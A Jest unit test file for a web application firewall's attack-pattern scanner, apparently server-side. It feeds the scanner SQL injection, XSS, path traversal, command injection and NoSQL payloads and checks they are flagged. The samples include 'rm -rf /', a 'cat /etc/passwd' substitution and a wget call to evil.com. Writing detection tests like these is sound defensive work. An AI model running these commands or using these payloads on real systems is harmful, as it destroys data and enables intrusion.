/**
 * Unit tests for server/utils/waf.js — attack-pattern detection.
 */
const { scan } = require('../../utils/waf');

describe('WAF scan', () => {
  test('detects SQL injection payloads', () => {
    expect(scan("SELECT * FROM users WHERE id = 1 OR 1=1")).not.toBeNull();
    expect(scan("'; DROP TABLE users; --")).not.toBeNull();
    expect(scan("1 UNION SELECT username, password FROM users")).not.toBeNull();
    expect(scan("name=admin' AND sleep(5)--")).not.toBeNull();
  });

  test('detects XSS payloads', () => {
    expect(scan('<script>alert(1)</script>')).not.toBeNull();
    expect(scan('javascript:alert(document.cookie)')).not.toBeNull();
    expect(scan('<img src=x onerror=alert(1)>')).not.toBeNull();
  });

  test('detects path traversal payloads', () => {
    expect(scan('../../etc/passwd')).not.toBeNull();
    expect(scan('%2e%2e%2fetc%2fpasswd')).not.toBeNull();
    expect(scan('/etc/passwd')).not.toBeNull();
  });

  test('detects command injection payloads', () => {
    expect(scan('; rm -rf /')).not.toBeNull();
    expect(scan('$(cat /etc/passwd)')).not.toBeNull();
    expect(scan('`wget http://evil.com`')).not.toBeNull();
    expect(scan('| sh')).not.toBeNull();
  });

  test('detects NoSQL injection operators', () => {
    expect(scan('{"$where": "this.password"}')).not.toBeNull();
    expect(scan('{"$gt": ""}')).not.toBeNull();
  });

  test('detects sensitive data exposure in payloads', () => {
    expect(scan('api_key=sk_test_example_placeholder_1234567890')).not.toBeNull();
    expect(scan('password="hunter2secret"')).not.toBeNull();
  });

  test('returns null for benign input', () => {
    expect(scan('hello world')).toBeNull();
    expect(scan('The quick brown fox jumps over the lazy dog.')).toBeNull();
    expect(scan('')).toBeNull();
    expect(scan(null)).toBeNull();
    expect(scan(undefined)).toBeNull();
    expect(scan(12345)).toBeNull();
  });

  test('does not false-positive on normal API traffic', () => {
    expect(scan('/api/v1/users/123?limit=10&page=2')).toBeNull();
    expect(scan('{"name":"John Doe","email":"john@example.com"}')).toBeNull();
    expect(scan('{"filter":{"status":"active"}}')).toBeNull();
  });
});
